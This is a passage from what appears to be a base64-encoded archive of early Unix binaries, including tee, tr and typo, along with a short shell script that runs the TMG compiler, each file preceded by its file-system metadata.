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
ZCBcbiglMmQrXHcnJXMnKyVkbgoALmlmIFxuKCVkLVxuKCVkIC5uciAlZCBcbiglZAoALm
ZjIAcgQAoAJXMKAAclc0AHAAdAJXMHAAdAJXMHAAclc0AHAAdAJXNABwAAIAAKAC5mYwoA
LlRFCgAudGEgAFxuKCVkdSAACgBmHnIegB6IHgAAFwAhACIAJQAoAAAAFgAXABoAHQAhAC
YAAAAWABsAIQC8DHgMZgx4DEoMVAy8DGYMeAxKDFQMNAxeDLwMNAxeDHgMZnRvYSAgAABn
ZXRzICAAAHB1dHMgIAAALhNSEwAAY2dldGMgIABjZ2V0YzogJWQgaWxsZWdhbCBmaWxlIG
51bWJlcgBjZ2V0YzogJWQgbm90IG9wZW4gdG8gcmVhZABjZ2V0YzogZXJyb3Igb24gJWQA
fwBFUlJPUiAAAAAAAQACAGEAcgB3AAAA4BMsFBIUDBTcEyYUOhRjb3BlbjogYmFkIGZpbG
UgJXMAAAEAY3B1dGMgIABjcHV0YzogJWQgbm90IG9wZW4AY3B1dGM6IHdyaXRpbmcgJWQA
AAACYBfyFuIWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//AgA6IGFyZ3VtZW50IGNvdW50IH
dyb25nCgBUaGF0J3MgYWxsLCBmb2xrcwoAAAiJAAAAAByJAAAFiQAAAAADiQAAAAARiQAA
NGkTiQAAAAAEiQAAAADfCQAA1guWJcZlAAB3APTf/wEvZGV2AADMPszMzMzNzAoA
-- /usr/bin/tee mode=0100775 uid=3 gid=3 atime=174923773 mtime=174923773 base64=1 --
BwFGAjIABAQAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JEgIBiXcJAALG5SQAThHOZd
b/5hUBAN8JkAHWC0Ad2v/ARf+fwCUAIAIDAAoCAcAVAQA3EBACKAHOFbYBQB0GACYcAgDf
CXIB1gvBHfYBwQy3CvABMRBGAk4RzmXW/0AdBgAmHAIA3wnQAdYLwAsJBUAd2v/ARf+fwC
UAIAICtwrEAfVlAgAGAEAdBAD1CgQAwCUBANEFAwrEEAIKxCAWBvcLogECB8ILGQbOFQAC
5hV4AiYK3wmuAZYlAxAECsMLBQaOEN8J+AB3AEoBMp14AngEggqECsIlAALgBo4Q3wn4AN
sBdwkgAcblBgD3C1YBAwPAFQoAAgFAHQQANRD0/zUK9v8mATUK+P8cAUAdBABA7fb/QC30
/wMETh30/wQBTh0EAE7t9v9mHfb/zmV4BEAd+P/ADCYcRgLfCfABliW1Cvj/9S38APj/4A
Z1bfT/9v91LQQA9v/WBncAuABmEYURdx0EAOIAdx0GAN4AAIlcAgKGdwCsAIUVhwBmEYUR
QB0EAHcdBgDGAACJYgIChncAkAAACoUVhwBmEYURQB0EAHcdBgCsAHcdCACoAACJZgIChn
cAbACFFYcAZhGFEXcdBACUAHcdBgCQAACJbAIChncATgAACoUVhwBmEYURQB0EAHcdBgB2
AHcdCAByAACJcgIChncAKgCFFYcAZhGFEUAdBAABiUARhREmEeYQphDmC0gAQRFEGEMYQh
hGEYUVhwA3EDwEwBX//0YRhRWHAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAAIiQAAAAAciQAA
A4kAAAAAEokAAAAABIkAAAAA
-- /usr/bin/tmg mode=0100775 uid=3 gid=3 atime=169259169 mtime=169258920 --
/usr/lib/tmg $1.t $1.s
as - $1.s
ld /usr/lib/tmga a.out /usr/lib/tmgb /usr/lib/tmgc -ls
-- /usr/bin/tr mode=0100775 uid=3 gid=3 atime=174923802 mtime=174923802 base64=1 --
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
kAAAAA
-- /usr/bin/typo mode=0110775 uid=3 gid=3 atime=174923832 mtime=174923832 base64=1 --
BwFQGxoDMmMAAAAAAAABADCJBADgEwnwgBEmEtALNhACAPcJCAAOEN8JhhABiXcJ2hDG5R
4AzhXs/98Jxg4X9YBAN/z8c/cV9v/2cfUVAQDc/0Ad3P8ACwD+N/kIGyb49wloEsZlCABB
Hdz/V3QCADH8MnQ1/tz/Jvg39fAaJvj3CewRxmUQABfy8EIX9PDCJvj3CdISxmUIABf0AE
AA+0Ed3P/BDDEQMnK1Ctz/9SUAAdz/zgb3Ffb/iHH3lSAAuh33FbJ44nf3FbJ63nf3FbJ8
2nc3Ct53Nwrcd/cVAQDYd/UVAQD0//UlAQAEADMEQB30/8AMQG0GAAASyKUtACoCQB30/8
AMQG0GAAASAJwBAMEVZhs3EGIaESD+AnkABgBAHfT/wAxAbQYAABIAnAEADhDmFY4b3wlG
DNYL9wlUD7cKKB61CvT/9QoEAMwBtwocHvgB9wsUHh4CDgrmFasb3wncDtYLNRDq/84V0F
LmFWIfZh3q/98J+g6WJTUQ6P/AJdBSBAPOFbkb3wlECE4d6v/fCV4OzhUBAOYVAgDfCRwP
1gvARf7/wCUBAAcDzhUeCOYVAgDfCRwP1gv3FcMb+Hb3FdMb9Hb3FeMb8HYdAc4d2nbfCV
4ONQrs/0Ad7P/ADAAcrHiwig0AtQrs//UlAwDs//MGwB3AdvClegANAAQCzhXzG98JRAjO
FQEA5h2odt8J3A7WCzcQknbZBs4VtgHmHZR23wl0DtYLNxB+dkAd9P/ADEBtBgA3Eggd9S
UBAAQAAgNfAJ4D9RUCAAQANQr0/18AngP1C/T/AwI3ClB2EwEOCkAd9P/ADLUK9P9AbQYA
JhLfCdwO1gs3EDJ2BATOFQIc3wlECPcVAQDsG18AfgNOHez/5hUyeCYK3wn4CJYlxBX//w
MKwhUBAPcJ5AgA/hf5AEg1+N7/wR2wHFd0AgBx/zJ0AfcA8D4HtwqeHDsBARHBbYYYQZJX
cBsAhApAEMEQwW12GEGSQGA1EOb/gwrADAAcmh8XdAIAMP8ydDX33v8A8AUEQB3m/8AMsA
qaH0Ed5v9XcBsAQBCBEMFtPBhBkkBgNRDm/4IKAJxOJRd0AgAw/zJ0Nffe/wDwBARAHeb/
sIpOJUIt7P/CBMEdDBgBYUGSV3AbAEAQwR3+F8FgQZJAYDUQ5v/ADAAcmh8XdAIAMP8ydD
X33v8A8AUEQB3m/8AMsAqaH84VAgDfCaQJNRDs/wIDXwCGAvcLEHUEA84dCnXfCV4O9QoE
AAIDXwBKAg4KJgrfCUwJ1gvOHep03wleDvcJ8Ao1EPD/EwIOCuYd4nTmHeJ05hUnHOYVIR
zmFRIc3wmSDsZlCgDOFSoc3wlECPUl///w/wQCzhUvHN8JRAj3CUYMNRDo/0At8P8EA84V
NBzfCUQIzhW2AeYdlHTfCXQO1gs3EH50BATOFToc3wlECA4K5hVEHN8J3A7WCzcQZnQEBM
4VUxzfCUQI9xUBAFx0BAoFAfUl///m/wwDhArOFQEA3wleCDSQcB41EOb/wCUKAPACDgrm
HTp03wncDtYLNxAkdAQEzhVeHN8JRAj3FQEAGnT3CxZ0bQMDCgQKBQH1Jf//5v9mA4QK5h
2oFg5h5hUCAPcJqgPWCx6QNRDm/8AlCgDtAjUK7v81Ie7/4gXAHYIWQG3u/8iscB4IBw4R
5h1yFiYK3wn4CJYl0wHAHWQWQG3u/8iscB44BAMKJgH1Jf//5v8hAg4R5h1IFiYK3wn4CJ
